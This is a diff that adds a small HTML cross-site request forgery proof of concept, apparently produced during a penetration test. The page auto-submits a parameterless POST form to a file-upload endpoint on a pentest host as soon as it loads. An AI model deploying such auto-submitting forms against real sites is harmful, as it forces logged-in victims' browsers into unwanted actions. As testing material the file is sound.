@@ -1,0 +1,16 @@
+<!doctype html>
+<html lang="en">
+<head>
+  <meta charset="utf-8">
+  <title>CSRF PoC - Form</title>
+</head>
+<body>
+  <form id="csrf" action="https://pentest.cdd.io:443/vaults/1050593102/active_storage_direct_uploads" method="POST">
+    <!-- No form-compatible parameters were detected. -->
+    <input type="submit" value="Submit request">
+  </form>
+  <script>
+    document.getElementById("csrf").submit();
+  </script>
+</body>
+</html>
